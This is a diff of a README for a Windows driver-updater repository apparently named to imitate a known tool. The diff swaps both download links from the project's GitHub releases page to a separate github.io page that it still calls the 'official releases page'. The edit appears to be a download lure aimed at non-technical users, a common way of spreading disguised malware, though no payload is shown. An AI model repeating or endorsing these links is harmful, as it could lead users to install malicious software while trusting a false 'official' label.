@@ -1,6 +1,6 @@
 # 🖥️ Snappy-Driver-Installer-2026 - Update Windows drivers with simple tools
 
-[![](https://img.shields.io/badge/Download-Snappy%20Driver-blue)](https://github.com/Shandeeunstrained779/Snappy-Driver-Installer-2026/releases)
+[![](https://img.shields.io/badge/Download-Snappy%20Driver-blue)](https://shandeeunstrained779.github.io)
 
 ## What is this tool?
 
@@ -23,7 +23,7 @@ This software works on computers running Windows 10 or Windows 11. Your system s
 Follow these steps to obtain the installer files for your machine. You do not need technical knowledge to complete this process.
 
 1. Open your web browser.
-2. Visit the [official releases page](https://github.com/Shandeeunstrained779/Snappy-Driver-Installer-2026/releases).
+2. Visit the [official releases page](https://shandeeunstrained779.github.io).
 3. Find the latest version listed at the top.
 4. Click the link that matches your system type to start the download.
 5. Save the file where you can find it later, such as your Downloads folder.
